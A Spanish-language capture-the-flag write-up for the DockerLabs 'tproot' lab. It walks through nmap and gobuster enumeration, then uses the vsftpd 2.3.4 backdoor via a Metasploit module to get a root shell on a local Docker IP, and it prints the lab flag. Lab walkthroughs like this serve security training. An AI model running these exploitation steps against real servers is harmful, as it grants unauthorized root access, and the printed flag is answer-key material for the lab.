# DockerLabs - tproot

## Resumen
- **Dificultad:** Very Easy
- **Técnicas:** Enumeración de puertos, FTP enumeration, vsftpd 2.3.4 backdoor exploit
- **Tiempo:** ~30 minutos
- **Fecha:** 2026-04-12

## Info
| | |
|---|---|
| IP | 172.17.0.2 |
| OS | Ubuntu (Docker) |
| Servicios | 21/tcp (FTP), 80/tcp (HTTP) |

---

## Reconocimiento

### Escaneo de puertos

```bash
nmap -sCV -p- 172.17.0.2 -oN targeted
```

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 21/tcp | FTP | vsftpd 2.3.4 |
| 80/tcp | HTTP | Apache 2.4.58 |

**Nota:** El scan muestra `OOPS: cannot change directory:/var/ftp` — es normal, no es vulnerabilidad.

---

## Enumeración

### Gobuster (HTTP)

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/common.txt
```

| Directorio | Status |
|------------|--------|
| /index.html | 200 |
| /.htpasswd | 403 |
| /.htaccess | 403 |
| /server-status | 403 |

Solo la página por defecto de Apache — nada interesante.

---

## Explotación

### vsftpd 2.3.4 - Backdoor

El FTP corre vsftpd 2.3.4, una versión histórica con un backdoor conocido públicamente desde 2011.

**Busqueda de exploits:**

```bash
searchsploit vsftpd 2.3.4
```

```
--- ---------------------------------
 Exploit Title |  Path
--- ---------------------------------
vsftpd 2.3.4 | unix/remote/17491.rb
vsftpd 2.3.4 | unix/remote/49757.py
```

**Explotación con Metasploit:**

```bash
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 172.17.0.2
set RPORT 21
run
```

**Output:**

```
[*] 172.17.0.2:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 172.17.0.2:21 - USER: 331 Please specify the password.
[+] 172.17.0.2:21 - Backdoor service has been spawned, handling...
[+] 172.17.0.2:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
[*] Command shell session 1 opened (172.17.0.1:34225 -> 172.17.0.2:6200) at 2026-04-12 11:37:15 -0300
```

**Obtenemos shell como root directamente!**

El backdoor abre el puerto 6200 donde hay una shell esperando.

---

## Escalada de privilegios

Ya somos root directamente, no hay necesidad de escalar.

### Shell interactiva

```bash
SHELL=/bin/bash script -q /dev/null
```

---

## Flag

```bash
cd /root
cat root.txt
261fd3f32200f950f231816b4e9a0594
```

**Flag:** `261fd3f32200f950f231816b4e9a0594`

---

## Lecciones aprendidas

1. **vsftpd 2.3.4** tiene un backdoor histórico conocido desde 2011 — el exploit de Metasploit funciona directamente
2. **Versiones obsoletas = vulnerabilidades**: Siempre verificar versiones de servicios con `nmap -sV`
3. **El error "OOPS: cannot change directory"** en el scan de nmap es normal, no es vulnerabilidad
4. **searchsploit**: Siempre buscar exploits públicos para versiones antiguas de servicios

---

## Comandos útiles

```bash
# Reconocimiento
nmap -sCV -p- 172.17.0.2 -oN targeted

# Web enumeration
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/common.txt

# Buscar exploits
searchsploit vsftpd 2.3.4

# Explotación
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 172.17.0.2
run
```